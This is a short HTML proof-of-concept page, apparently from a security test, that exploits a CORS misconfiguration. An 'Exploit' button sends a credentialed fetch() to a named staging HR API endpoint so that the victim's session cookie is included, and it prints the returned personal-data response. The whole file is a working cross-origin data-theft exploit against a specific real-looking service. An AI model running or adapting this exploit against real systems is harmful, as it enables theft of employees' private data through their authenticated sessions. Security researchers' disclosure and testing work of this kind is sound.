<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>CORS GET PoC</title>
</head>
<body>
  <h2>CORS GET PoC</h2>
  <button onclick="exploit()">Exploit</button>

  <pre id="output"></pre>

  <script>
    function exploit() {
      fetch("https://api.stg.hrms.powerschoolcorp.com/svc/hrms-api/widget/mykeydata", {
        method: "GET",
        mode: "cors",
        credentials: "include", // ensures sid cookie is sent
        headers: {
          "Accept": "*/*"
        }
      })
      .then(res => res.text())
      .then(data => {
        document.getElementById("output").innerText = "Response:\n" + data;
      })
      .catch(err => {
        document.getElementById("output").innerText = "Error:\n" + err;
      });
    }
  </script>
</body>
</html>
